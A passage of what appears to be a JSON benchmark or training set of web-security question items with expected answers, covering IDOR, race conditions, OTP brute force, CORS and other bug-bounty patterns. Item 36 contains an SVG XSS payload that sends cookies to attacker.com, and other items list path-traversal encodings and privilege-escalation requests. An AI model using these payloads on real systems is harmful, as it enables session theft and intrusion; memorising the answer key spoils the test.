+    "expected_answer": "This is a method-based access control bypass where the authorization enforcement differs between HTTP methods, allowing an attacker to use alternative methods like HEAD, OPTIONS, PUT, PATCH, or even custom methods to circumvent access restrictions applied only to GET and POST requests. The inconsistency suggests the access control logic is implemented at the routing level rather than the resource level, meaning the same resource is protected for some methods but exposed for others. The real-world impact includes information disclosure through HEAD response headers revealing content length and type of protected resources, and potentially full access control bypass if methods like PUT or PATCH also lack authorization checks. A proof-of-concept involves sending the same endpoint request using all HTTP methods (GET, HEAD, OPTIONS, PUT, PATCH, DELETE, TRACE) and comparing response codes to identify methods that bypass the 403 restriction, then leveraging accessible methods to read or modify protected resources. Remediation requires implementing authorization checks at the resource level rather than the route/method level, ensuring all HTTP methods are subject to the same access control policy, explicitly denying all methods not required for business functionality, and using framework-level security filters that intercept requests before method-specific routing.",
+    "reasoning_requirement": "Recognize HTTP method enforcement inconsistency.",
+    "evaluation_criteria": "Mentions alternative HTTP method testing.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 31,
+    "scenario": "An email verification link works even after email is changed.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an improper token invalidation vulnerability where email verification tokens are not revoked or regenerated when the associated email address is changed, creating a stale credential reuse risk. An attacker who intercepts or obtains an old verification link (through email compromise, log exposure, or social engineering) can verify an account using an outdated token even after the user has updated their email to a different address. The real-world impact includes account takeover scenarios where an attacker with access to the original email can verify and potentially gain control of accounts that have since been associated with a different email, and verification bypass that undermines the email ownership proof. A proof-of-concept involves registering an account, requesting email verification, changing the email address to a new one, then using the original verification link to confirm the account and observing whether it validates successfully. Remediation requires invalidating all pending verification tokens whenever the associated email address is changed, generating new verification tokens tied to the current email value, implementing token-to-email binding so the token is only valid for the specific email it was issued for, and adding expiration timestamps to all verification tokens.",
+    "reasoning_requirement": "Understand verification token lifecycle.",
+    "evaluation_criteria": "Mentions stale token reuse risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 32,
+    "scenario": "API rate limit resets every second with no burst control.",
+    "prompt": "What bypass should be considered?",
+    "expected_answer": "This rate limiting implementation is vulnerable to high-frequency distributed burst attacks because the per-second reset window allows an attacker to maximize requests within each window boundary without triggering persistent blocks. By timing requests to arrive at the boundary of each one-second window, an attacker can effectively double their request rate, and without burst control, they can send the full quota instantaneously at the start of each window. The real-world impact enables credential stuffing, brute force attacks, API abuse, and data scraping at rates significantly higher than the intended limit, especially when combined with multiple source IPs or accounts. A proof-of-concept involves scripting requests that fire the maximum allowed count at the precise start of each second window, measuring actual throughput versus intended limits, and demonstrating that sustained abuse is feasible without triggering any blocking. Remediation requires implementing sliding window or token bucket rate limiting algorithms that prevent burst exploitation, adding progressive penalties for sustained high-volume requests, implementing rate limits across multiple dimensions (IP, account, API key), and adding longer-duration rate limits (per minute, per hour) alongside per-second limits to catch sustained abuse patterns.",
+    "reasoning_requirement": "Recognize sliding window weakness.",
+    "evaluation_criteria": "Mentions burst exploitation.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 33,
+    "scenario": "A JSON API reveals incremental invoice IDs.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is an IDOR (Insecure Direct Object Reference) vulnerability via predictable identifiers where sequential invoice IDs allow systematic enumeration of all invoices in the system. An attacker can iterate through invoice numbers to access, download, or modify invoices belonging to other users or organizations, exposing sensitive financial data including customer names, addresses, payment amounts, and transaction details. The real-world impact includes mass financial data exfiltration, privacy violations (PII exposure in invoices), competitive intelligence gathering from business transaction details, and potential regulatory compliance violations under GDPR or PCI-DSS. A proof-of-concept involves noting the current invoice ID, then using Burp Intruder to decrement and increment the ID parameter systematically, comparing response sizes to identify invoices belonging to other users, and documenting the leaked financial data. Remediation requires replacing sequential IDs with UUIDs or other non-enumerable identifiers, implementing authorization checks that verify the requesting user owns or has permission to access each invoice, adding rate limiting on invoice retrieval endpoints, and implementing access logging for audit trails.",
+    "reasoning_requirement": "Recognize object enumeration risk.",
+    "evaluation_criteria": "Mentions horizontal privilege escalation.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 34,
+    "scenario": "Admin role is determined by a cookie value.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is a privilege escalation vulnerability via client-side trust where the application relies on a cookie value (such as role=user or isAdmin=false) to determine authorization levels, allowing trivial tampering for administrative access. Since cookies are fully controlled by the client, an attacker can modify the cookie value using browser developer tools or a proxy to change role=user to role=admin or isAdmin=true, immediately gaining full administrative privileges. The real-world impact is complete vertical privilege escalation with zero authentication requirements, granting an attacker full admin panel access, user management capabilities, data export functionality, and system configuration control. A proof-of-concept involves inspecting cookies in the browser, identifying the role-related cookie, modifying its value to an administrative role using the browser console (document.cookie = 'role=admin'), refreshing the page, and documenting the elevated access. Remediation requires storing role and permission data exclusively server-side in session storage or a database, implementing server-side authorization checks on every privileged request that reference the authenticated session's stored role, using signed or encrypted session tokens that prevent client-side tampering, and never trusting any client-supplied authorization data.",
+    "reasoning_requirement": "Recognize insecure client-side authorization logic.",
+    "evaluation_criteria": "Mentions server-side validation absence.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 35,
+    "scenario": "Application uses HTTP for internal microservice calls.",
+    "prompt": "What vulnerability chain may exist?",
+    "expected_answer": "This creates an internal traffic interception vulnerability where unencrypted HTTP communication between microservices exposes authentication tokens, API keys, session data, and sensitive business data to man-in-the-middle attacks within the internal network. An attacker who gains access to any point in the internal network (through a compromised service, container escape, or SSRF) can passively sniff all inter-service communication using tools like tcpdump or Wireshark to capture credentials and sensitive payloads. The real-world impact includes lateral movement through credential capture, data exfiltration of all inter-service communications, session hijacking across microservices, and complete compromise of the service mesh if authentication tokens are captured. A proof-of-concept involves gaining network-level access to the internal environment (even read-only), running packet capture on the relevant network interfaces, filtering for HTTP traffic between services, and demonstrating captured credentials, API keys, or session tokens in cleartext. Remediation requires enforcing mutual TLS (mTLS) for all inter-service communication, implementing a service mesh like Istio or Linkerd that handles encryption transparently, using certificate-based authentication between services, encrypting sensitive data at the application layer in addition to transport encryption, and implementing network segmentation to limit blast radius.",
+    "reasoning_requirement": "Recognize unencrypted internal communication risk.",
+    "evaluation_criteria": "Mentions MITM feasibility.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 36,
+    "scenario": "An upload endpoint processes SVG files and renders them inline.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a Stored XSS vulnerability through malicious SVG payloads, as SVG files are XML-based and can contain embedded JavaScript that executes when the SVG is rendered in a browser context. An attacker can upload an SVG file containing script elements like <svg onload=\"alert(document.cookie)\"> or <svg><script>fetch('https://attacker.com/steal?c='+document.cookie)</script></svg>, and when any user views the rendered SVG, the malicious code executes in their browser session. The real-world impact includes persistent XSS affecting all users who view the uploaded content, session hijacking through cookie theft, credential harvesting via phishing overlays, and account takeover when the SVG is displayed on public-facing pages like profiles or comments. A proof-of-concept involves crafting an SVG file with embedded JavaScript using event handlers or script tags, uploading it through the file upload endpoint, then accessing the rendered SVG URL and demonstrating script execution in the browser. Remediation requires sanitizing SVG files server-side to strip all script elements and event handlers, serving uploaded SVGs with Content-Type: image/svg+xml and Content-Disposition: attachment headers, rendering SVGs in sandboxed iframes with the sandbox attribute, or converting SVGs to rasterized formats (PNG/JPEG) before serving to users.",
+    "reasoning_requirement": "Recognize SVG as script-capable format.",
+    "evaluation_criteria": "Mentions embedded script execution.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 37,
+    "scenario": "A GraphQL mutation allows updating arbitrary user fields.",
+    "prompt": "What vulnerability class applies?",
+    "expected_answer": "This is a Broken Access Control combined with Mass Assignment vulnerability in a GraphQL context where mutations lack field-level authorization, allowing authenticated users to modify any field on user objects including restricted attributes. An attacker can craft mutation queries that update fields like role, permissions, emailVerified, accountBalance, or subscription tier that should only be modifiable by administrators or system processes. The real-world impact includes vertical privilege escalation to admin roles, financial manipulation through balance modifications, bypassing verification workflows, and corrupting other users' account data. A proof-of-concept involves using GraphQL introspection to discover all available fields on the User type, then sending a mutation like mutation { updateUser(id: \"self\", input: { role: \"ADMIN\", emailVerified: true }) { id role } } and verifying the unauthorized field changes persist. Remediation requires implementing field-level authorization in GraphQL resolvers that validate which fields each user role can modify, using input types that explicitly define allowed fields per mutation, applying the principle of least privilege to all mutation operations, and adding field-level audit logging for sensitive attribute changes.",
+    "reasoning_requirement": "Recognize insufficient field-level authorization.",
+    "evaluation_criteria": "Mentions modifying restricted fields.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 38,
+    "scenario": "An API exposes debug endpoint in production.",
+    "prompt": "What impact should be evaluated?",
+    "expected_answer": "An exposed debug endpoint in production creates severe information disclosure and potentially remote code execution risks, as debug interfaces typically provide access to environment variables, database connections, system configuration, application internals, and sometimes interactive code execution capabilities. Debug endpoints like /debug, /actuator, /_profiler, /phpinfo, or /console often expose framework versions with known CVEs, database credentials, API keys stored in environment variables, memory dumps, and request/response logs containing user sessions. The real-world impact ranges from complete infrastructure compromise through RCE (e.g., Django debug console, Spring Boot Actuator with env endpoint, Rails console), to massive data exposure through configuration dumps revealing all application secrets. A proof-of-concept involves accessing the debug endpoint, documenting exposed sensitive information including credentials, internal IPs, and software versions, and if an interactive console is available, demonstrating command execution capability. Remediation requires immediately disabling or removing all debug endpoints in production, implementing environment-specific configuration that automatically disables debug features outside development, adding authentication requirements to any diagnostic endpoints that must remain accessible, and conducting regular production scanning for exposed development tools.",
+    "reasoning_requirement": "Recognize debug functionality risk.",
+    "evaluation_criteria": "Mentions sensitive system details exposure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 39,
+    "scenario": "A payment API checks balance before transaction but not after concurrent requests.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a race condition vulnerability leading to double spending, where the Time-of-Check to Time-of-Use (TOCTOU) gap between balance verification and transaction execution allows concurrent requests to pass validation simultaneously before any deduction is committed. When multiple withdrawal or payment requests arrive concurrently, each independently verifies sufficient balance exists, then all proceed to deduct, resulting in the total deductions exceeding the available balance. The real-world impact is direct financial loss to the platform, as attackers can extract more money than their account contains, create negative balances, or duplicate digital asset purchases, with the abuse being trivially scalable through automated concurrent requests. A proof-of-concept involves setting an account balance to $100, then using a race condition tool like Turbo Intruder to send 20 simultaneous $100 withdrawal requests, and verifying that multiple transactions succeed, resulting in a total withdrawal exceeding the original $100 balance. Remediation requires implementing pessimistic database locking (SELECT FOR UPDATE) on the balance row before validation, using database-level constraints that prevent negative balances, implementing idempotency keys for transaction requests, applying serializable transaction isolation, and adding post-transaction balance verification with automatic reversal for detected anomalies.",
+    "reasoning_requirement": "Recognize transaction atomicity failure.",
+    "evaluation_criteria": "Mentions concurrency exploitation.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 40,
+    "scenario": "JWT expiration is not validated on server.",
+    "prompt": "What impact exists?",
+    "expected_answer": "This vulnerability allows the use of expired JWT tokens for indefinite authentication, effectively granting permanent session access from a single token issuance. Without server-side expiration validation, a JWT that was legitimately issued can be used forever, even after the intended session duration has elapsed, making token revocation impossible and invalidating any session timeout policies. The real-world impact is severe: compromised tokens never expire, meaning a stolen JWT from a log file, browser cache, or network interception grants permanent access to the victim's account regardless of password changes or account recovery actions. A proof-of-concept involves capturing a valid JWT, waiting beyond its stated exp claim time, then submitting it in the Authorization header and demonstrating the server still accepts it and grants authenticated access. Remediation requires implementing strict server-side validation of the exp (expiration), iat (issued at), and nbf (not before) claims during token verification, using short-lived access tokens (15 minutes or less) with refresh token rotation, maintaining a server-side token blacklist for revocation, and implementing token binding to prevent replay from different clients.",
+    "reasoning_requirement": "Recognize expiration enforcement importance.",
+    "evaluation_criteria": "Mentions session persistence beyond intended period.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 41,
+    "scenario": "An API returns excessive user profile data including internal flags.",
+    "prompt": "What vulnerability class applies?",
+    "expected_answer": "This is an Excessive Data Exposure vulnerability (OWASP API Security Top 10 - API3) where the API returns more data than the client needs, including internal fields, debug flags, and sensitive metadata that should never be exposed to end users. The API may return fields like isAdmin, internalNotes, accountFlags, passwordHash, securityQuestions, or billing details that the frontend never displays but are fully visible in the API response to anyone inspecting network traffic. The real-world impact includes exposure of sensitive PII violating privacy regulations, leaking internal system flags that reveal business logic for exploitation, exposing hidden administrative capabilities, and providing attackers with detailed knowledge of the user model for crafting mass assignment or privilege escalation attacks. A proof-of-concept involves making a standard API call to the user profile endpoint, examining the full JSON response in Burp Suite or browser DevTools, and documenting all fields that contain sensitive information not displayed in the UI. Remediation requires implementing explicit response schemas that whitelist only the fields needed by the client, using DTOs or serializers that filter sensitive attributes before responding, applying field-level access control that returns different data based on the requester's role, and conducting regular API response audits to identify data leakage.",
+    "reasoning_requirement": "Recognize over-disclosure risk.",
+    "evaluation_criteria": "Mentions sensitive metadata exposure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 42,
+    "scenario": "A file download endpoint validates file path using blacklist.",
+    "prompt": "What should be tested?",
+    "expected_answer": "Blacklist-based path validation is inherently vulnerable to bypass through various encoding techniques and alternative traversal sequences that evade the filter while achieving the same directory traversal effect. Attackers can use URL encoding (%2e%2e%2f), double URL encoding (%252e%252e%252f), Unicode encoding (..%c0%af), null byte injection (../../../etc/passwd%00.jpg), backslash substitution (..\\..\\), and mixed encoding to bypass blacklist rules that only match literal ../ sequences. The real-world impact is arbitrary file read from the server filesystem, exposing configuration files with database credentials, private keys, source code, and sensitive system files like /etc/shadow. A proof-of-concept involves systematically testing each encoding variant against the download endpoint, starting with single URL encoding and progressing through double encoding, Unicode normalization variants, and mixed separator characters until the filter is bypassed. Remediation requires replacing blacklist validation with a whitelist approach, resolving the canonical path and verifying it remains within the allowed directory using language-specific path resolution functions, implementing a chroot or container boundary, and avoiding user-controlled file paths entirely by using indirect references mapped to allowed files server-side.",
+    "reasoning_requirement": "Recognize blacklist filtering weaknesses.",
+    "evaluation_criteria": "Mentions encoding or alternate path patterns.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 43,
+    "scenario": "A system logs full request URLs including reset tokens.",
+    "prompt": "What vulnerability may result?",
+    "expected_answer": "This is a sensitive token leakage vulnerability through application logs, where password reset tokens recorded in URL-format log entries become accessible to anyone with log access, creating an indirect account takeover path. Logs are typically stored in multiple locations including application log files, web server access logs, SIEM systems, log aggregation services like Splunk or ELK, and CDN logs, dramatically expanding the exposure surface. The real-world impact includes account takeover by internal employees or attackers who compromise log infrastructure, compliance violations under regulations that require protection of authentication credentials, and persistent exposure since logs may be retained for months or years. A proof-of-concept involves triggering a password reset, then searching application logs, web server access logs, or any log aggregation platform for the reset token value, demonstrating it is stored in cleartext and accessible to log viewers. Remediation requires sending sensitive tokens via POST request bodies instead of URL query parameters, implementing log sanitization that redacts sensitive patterns, using token references that map to server-side stored values rather than including actual tokens in URLs, and configuring log retention policies that minimize exposure duration.",
+    "reasoning_requirement": "Recognize token propagation risk.",
+    "evaluation_criteria": "Mentions log-based credential exposure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 44,
+    "scenario": "An endpoint allows unlimited OTP attempts without delay.",
+    "prompt": "What should be evaluated?",
+    "expected_answer": "This is an OTP brute force vulnerability where the absence of rate limiting and attempt restrictions on the one-time password verification endpoint allows systematic enumeration of all possible OTP values. For a standard 6-digit numeric OTP (1,000,000 combinations), an attacker can exhaust the entire keyspace within minutes using automated tools, with typical success achievable in under 500,000 attempts on average due to probability. The real-world impact is complete bypass of two-factor authentication and account takeover, as an attacker who has obtained valid credentials can brute-force the OTP to bypass the second authentication factor. A proof-of-concept involves initiating an authentication flow that triggers OTP generation, then using Burp Intruder with a numeric payload from 000000 to 999999 against the OTP verification endpoint, filtering responses by status code or content length to identify the valid code. Remediation requires implementing strict rate limiting (maximum 3-5 attempts per OTP), adding exponential backoff delays between attempts, invalidating the OTP after a small number of failed attempts and requiring regeneration, implementing account lockout after repeated OTP failures, and using time-based OTPs (TOTP) with short validity windows.",
+    "reasoning_requirement": "Recognize lack of rate limiting.",
+    "evaluation_criteria": "Mentions attempt frequency feasibility.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 45,
+    "scenario": "A web app relies on referer header for CSRF protection.",
+    "prompt": "What vulnerability may exist?",
+    "expected_answer": "This is a CSRF bypass vulnerability because the Referer header is an unreliable protection mechanism that can be omitted, spoofed, or stripped by browsers, proxies, and privacy extensions. An attacker can craft a cross-site request that suppresses the Referer header using meta referrer-policy directives (<meta name='referrer' content='no-referrer'>), data: URIs, or HTTPS-to-HTTP transitions, causing the application to either accept the request without a Referer or fail to validate properly. The real-world impact includes unauthorized state-changing actions performed on behalf of authenticated users, such as password changes, fund transfers, email modifications, and account deletions triggered by visiting a malicious page. A proof-of-concept involves creating an HTML page with a form that submits a state-changing request to the target application, using <meta name='referrer' content='no-referrer'> to suppress the Referer header, hosting it on an attacker-controlled domain, and demonstrating the action executes successfully in the victim's authenticated session. Remediation requires implementing proper anti-CSRF tokens (synchronizer token pattern or double-submit cookie), using SameSite cookie attributes set to Strict or Lax, validating the Origin header as a more reliable alternative to Referer, and employing framework-provided CSRF protection mechanisms.",
+    "reasoning_requirement": "Understand unreliable header validation.",
+    "evaluation_criteria": "Mentions forged or omitted referer.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 46,
+    "scenario": "A SaaS app isolates tenants by subdomain but shares same API backend.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This creates a cross-tenant data access vulnerability where tenant isolation exists only at the presentation layer (subdomain routing) but the shared API backend may not enforce tenant-level authorization on every request. An attacker can test for IDOR-based cross-tenant access by manipulating resource IDs, tenant identifiers, or API parameters to access data belonging to other tenants, since all tenants share the same database and API infrastructure. The real-world impact is catastrophic for a SaaS platform: a single tenant compromise can expose data from all customers, violating data isolation commitments, breaching SLAs, and causing regulatory violations under GDPR, HIPAA, or SOC 2 requirements. A proof-of-concept involves authenticating as Tenant A, capturing API requests, then modifying tenant-specific parameters (tenant_id, organization_id, subdomain references) to Tenant B's values and observing whether the API returns Tenant B's data or allows modifications to their resources. Remediation requires implementing tenant-scoped database queries that automatically filter by the authenticated tenant's ID, adding tenant validation middleware that runs on every API request, using row-level security policies in the database, implementing separate encryption keys per tenant, and conducting regular cross-tenant penetration testing.",
+    "reasoning_requirement": "Recognize multi-tenant isolation risks.",
+    "evaluation_criteria": "Mentions tenant boundary enforcement.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 47,
+    "scenario": "An API endpoint reveals detailed password policy.",
+    "prompt": "What impact should be considered?",
+    "expected_answer": "Exposing detailed password policy information significantly improves brute force attack efficiency by allowing attackers to constrain their password generation algorithms to only produce candidates matching the policy requirements. If an attacker knows the password must be 8-16 characters with at least one uppercase letter, one number, and one special character, they can eliminate vast portions of the keyspace, potentially reducing brute force time by orders of magnitude compared to unrestricted attempts. The real-world impact includes optimized credential stuffing and dictionary attacks that generate only policy-compliant candidates, more effective targeted password guessing based on the specific requirements, and information that helps attackers evaluate whether rainbow tables or hashcat rule sets can be tailored to the policy. A proof-of-concept involves querying the policy endpoint, using the constraints to generate a targeted wordlist with tools like hashcat rule-based generation or custom scripts, and comparing the reduced keyspace size to demonstrate the significant advantage over blind brute forcing. Remediation requires removing public-facing password policy detail endpoints, displaying password requirements only on the registration and password change forms within authenticated sessions, implementing account lockout and rate limiting that make brute force infeasible regardless of keyspace optimization, and using breached password databases to block commonly compromised passwords.",
+    "reasoning_requirement": "Recognize information aiding attackers.",
+    "evaluation_criteria": "Mentions attacker optimization.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 48,
+    "scenario": "A password reset flow verifies email but not ownership of account ID parameter.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an account takeover vulnerability through parameter manipulation in the password reset flow, where the application verifies the email belongs to a valid account but allows the attacker to tamper with the account ID parameter to reset a different account's password. The disconnect between email validation and account ID binding means an attacker can submit their own email for verification but change the account_id parameter to target a victim's account, receiving the reset confirmation while the password change applies to the victim. The real-world impact is direct account takeover of any user account without requiring access to the victim's email, as the attacker controls both the email verification and the target account parameter independently. A proof-of-concept involves initiating a password reset with the attacker's email, intercepting the reset request in Burp Suite, changing the account_id or user_id parameter to the victim's identifier while keeping the attacker's verified email, and completing the reset flow to set a new password on the victim's account. Remediation requires cryptographically binding the reset token to the specific account and email combination, generating tokens server-side that embed the target account reference, removing any client-controllable account identifier from the reset flow, and validating that the account being reset matches the account associated with the verification token.",
+    "reasoning_requirement": "Recognize missing account binding validation.",
+    "evaluation_criteria": "Mentions ID tampering impact.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 49,
+    "scenario": "An application loads third-party scripts without integrity checks.",
+    "prompt": "What risk exists?",
+    "expected_answer": "This creates a supply chain attack vulnerability where compromised or malicious third-party scripts can execute arbitrary code in the context of the application, with full access to the DOM, cookies, localStorage, and user sessions. Without Subresource Integrity (SRI) hashes, if the CDN or third-party hosting service is compromised, an attacker can replace the legitimate script with malicious code that silently executes for all users, stealing credentials, injecting cryptominers, or redirecting to phishing pages. The real-world impact is massive: a single compromised third-party script (as seen in the British Airways Magecart attack) can affect millions of users, exfiltrating payment card data, session tokens, and personal information without any visible indication of compromise. A proof-of-concept involves demonstrating that the loaded scripts lack integrity attributes by inspecting the HTML source for missing integrity= attributes on script tags, then explaining how a CDN compromise would allow arbitrary code injection. Remediation requires implementing Subresource Integrity (SRI) hashes on all externally-loaded scripts and stylesheets, hosting critical scripts locally rather than relying on CDNs, using Content Security Policy to restrict allowed script sources, implementing monitoring for changes in third-party script content, and regularly auditing all external dependencies for security advisories.",
+    "reasoning_requirement": "Recognize script trust boundaries.",
+    "evaluation_criteria": "Mentions lack of Subresource Integrity (SRI).",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 50,
+    "scenario": "A webhook endpoint accepts unsigned JSON payloads.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a webhook forgery vulnerability where the absence of cryptographic signature verification on incoming webhook payloads allows an attacker to send fabricated events that the application processes as legitimate, potentially triggering privileged actions like order fulfillment, payment confirmation, or account provisioning. Without HMAC signature validation, any party who discovers the webhook URL can craft arbitrary JSON payloads mimicking events from the expected provider (e.g., Stripe, GitHub, or Slack) to manipulate application state. The real-world impact includes fraudulent payment confirmations that release goods without actual payment, account provisioning triggered by forged registration events, data manipulation through fake update notifications, and privilege escalation through crafted administrative event payloads. A proof-of-concept involves discovering the webhook endpoint URL through documentation, JavaScript source, or traffic analysis, then sending a crafted JSON payload mimicking a payment_success or subscription_activated event using curl, and observing whether the application processes it as a legitimate event. Remediation requires implementing HMAC signature verification using a shared secret for all webhook payloads, validating the timestamp to prevent replay attacks, allowlisting source IP addresses of the webhook provider, implementing idempotency checks to prevent duplicate processing, and logging all webhook events for audit trail analysis.",
+    "reasoning_requirement": "Recognize missing signature validation.",
+    "evaluation_criteria": "Mentions ability to trigger privileged actions.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 51,
+    "scenario": "An API validates user role on login but not on subsequent privileged requests.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a privilege escalation vulnerability through missing authorization checks on privileged endpoints, where the API only verifies the user's role during the initial login but fails to enforce authorization on subsequent requests that perform sensitive operations. An attacker can authenticate as a regular user, then directly call administrative API endpoints (discovered through documentation, JavaScript source inspection, or API fuzzing) and the server will process the requests without verifying the caller's authorization level. The real-world impact includes a regular user performing admin-level operations like managing other users, modifying system configuration, accessing financial reports, and exporting sensitive data, effectively bypassing the entire role-based access control system. A proof-of-concept involves authenticating as a low-privilege user, then making direct API calls to admin endpoints like /api/admin/users, /api/admin/settings, or /api/admin/export using the regular user's session token, and documenting successful access to privileged functionality. Remediation requires implementing authorization middleware that validates the user's role and permissions on every request before processing, using a centralized authorization service or policy engine, applying the principle of least privilege, implementing role-based access control (RBAC) or attribute-based access control (ABAC) at every API layer, and adding authorization unit tests for all privileged endpoints.",
+    "reasoning_requirement": "Recognize authorization must be enforced on every sensitive request.",
+    "evaluation_criteria": "Mentions broken access control beyond initial authentication.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 52,
+    "scenario": "A file export feature generates predictable download URLs.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an IDOR vulnerability through predictable file identifiers where the export feature generates download URLs with sequential or easily guessable patterns, allowing unauthorized access to other users' exported files. An attacker can analyze the URL structure of their own export downloads, identify the predictable component (timestamp, sequential ID, or simple hash), and enumerate other users' exports to access sensitive documents containing financial reports, user data, or business intelligence. The real-world impact includes unauthorized access to confidential business documents, exposure of PII in exported user lists or reports, competitive intelligence theft from financial exports, and regulatory violations from unauthorized data access. A proof-of-concept involves generating an export, capturing the download URL, modifying the predictable identifier component (incrementing IDs, testing nearby timestamps), and accessing other users' exported files, documenting the types of sensitive data exposed. Remediation requires generating download URLs with cryptographically random tokens (at least 128 bits of entropy), implementing authorization checks that verify the requesting user owns the export, using signed URLs with short expiration times, storing exports in access-controlled storage with per-user permissions, and implementing access logging for all file download operations.",
+    "reasoning_requirement": "Recognize enumeration of resource IDs.",
+    "evaluation_criteria": "Mentions unauthorized file access through ID manipulation.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 53,
+    "scenario": "An API trusts the X-Forwarded-For header for rate limiting.",
+    "prompt": "What bypass should be evaluated?",
+    "expected_answer": "This is a rate limiting bypass through X-Forwarded-For header spoofing, where the API trusts client-supplied proxy headers for IP identification, allowing an attacker to send a different IP address with each request to circumvent per-IP rate limits entirely. By adding or modifying the X-Forwarded-For header with random IP addresses on each request, an attacker can make unlimited requests that the rate limiter treats as originating from different sources. The real-world impact enables unrestricted brute force attacks against authentication endpoints, unlimited API abuse and data scraping, credential stuffing at massive scale, and denial of service through resource exhaustion without triggering rate limiting protections. A proof-of-concept involves sending requests to a rate-limited endpoint with a changing X-Forwarded-For header value (e.g., X-Forwarded-For: 1.2.3.{N} incrementing N), demonstrating that rate limiting never triggers regardless of request volume from the same actual source IP. Remediation requires configuring the application to only trust X-Forwarded-For headers from known proxy/load balancer IPs, using the rightmost-first trusted proxy chain resolution, implementing rate limiting based on multiple signals (authenticated user, API key, session, and actual connection IP), and adding behavioral analysis that detects anomalous header patterns.",
+    "reasoning_requirement": "Recognize client-controlled header trust issue.",
+    "evaluation_criteria": "Mentions header manipulation risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 54,
+    "scenario": "A password reset endpoint leaks whether an email exists.",
+    "prompt": "What vulnerability does this create?",
+    "expected_answer": "This is a user enumeration vulnerability where the password reset endpoint returns different responses (different error messages, HTTP status codes, response times, or response sizes) depending on whether the submitted email address is registered in the system. An attacker can use this differential response to compile a list of valid user accounts by submitting a large list of email addresses and classifying each response, building a validated target list for subsequent credential stuffing or phishing campaigns. The real-world impact includes enabling targeted phishing attacks against confirmed users, facilitating credential stuffing with verified email addresses, privacy violations by confirming individual email registrations, and competitive intelligence by enumerating competitors' employee accounts on business platforms. A proof-of-concept involves submitting both a known-valid and known-invalid email to the reset endpoint, comparing the responses (message text, HTTP status code, response time, content length), and documenting the distinguishable differences that confirm account existence. Remediation requires returning identical responses for both existing and non-existing emails (e.g., 'If an account exists with this email, a reset link has been sent'), ensuring consistent response timing using constant-time comparisons, implementing CAPTCHA to prevent automated enumeration, and rate limiting the reset endpoint to slow down large-scale enumeration attempts.",
+    "reasoning_requirement": "Recognize differential response disclosure.",
+    "evaluation_criteria": "Mentions privacy and brute-force preparation impact.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 55,
+    "scenario": "An internal API endpoint is accessible from public network due to CORS misconfiguration.",
+    "prompt": "What impact should be evaluated?",
+    "expected_answer": "This is a cross-origin data theft vulnerability caused by overly permissive CORS (Cross-Origin Resource Sharing) configuration that allows malicious websites to make authenticated requests to the internal API and read the responses. When the API sets Access-Control-Allow-Origin to a wildcard (*) or reflects the attacker's origin with Access-Control-Allow-Credentials: true, a malicious website can use JavaScript to make authenticated cross-origin requests and exfiltrate the response data. The real-world impact includes theft of sensitive user data, internal API responses, and session information when a victim visits an attacker-controlled website while authenticated to the vulnerable application, effectively breaking the same-origin policy protection. A proof-of-concept involves creating a malicious HTML page with JavaScript that makes fetch() or XMLHttpRequest calls to the vulnerable API endpoint with credentials: 'include', hosting it on an attacker-controlled domain, and demonstrating that the response data is accessible to the attacker's script when a victim visits the page. Remediation requires implementing strict origin validation using an explicit whitelist of trusted domains, never reflecting arbitrary origins with credential support, removing wildcard CORS headers from authenticated endpoints, implementing proper preflight request handling, and auditing all API endpoints for CORS header configuration.",
+    "reasoning_requirement": "Understand CORS trust model weakness.",
+    "evaluation_criteria": "Mentions improper origin validation.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 56,
+    "scenario": "Application uses numeric OTP valid for 10 minutes without attempt limits.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an OTP brute force attack vulnerability where the combination of a numeric-only OTP format, a generous 10-minute validity window, and the absence of attempt rate limiting creates a feasible brute force scenario. A standard 6-digit numeric OTP has 1,000,000 possible values, and with 10 minutes of validity and no attempt throttling, an attacker making 200 requests per second can test all combinations in approximately 83 minutes\u2014well within reach if the OTP validity period can be renewed. The real-world impact is complete two-factor authentication bypass leading to account takeover, as the attacker only needs valid primary credentials and can then systematically determine the OTP through exhaustive enumeration. A proof-of-concept involves triggering OTP generation for a target account, then using a high-throughput tool like Turbo Intruder to send rapid sequential OTP verification requests, measuring the actual rate achievable and calculating the time needed to exhaust the keyspace within the validity window. Remediation requires implementing strict per-OTP attempt limits (3-5 maximum), adding exponential backoff between failed attempts, using longer OTP codes (8+ characters) with alphanumeric character sets for higher entropy, reducing the validity window to 60-90 seconds, and implementing account-level throttling that triggers after repeated OTP failures.",
+    "reasoning_requirement": "Assess entropy vs attempt window.",
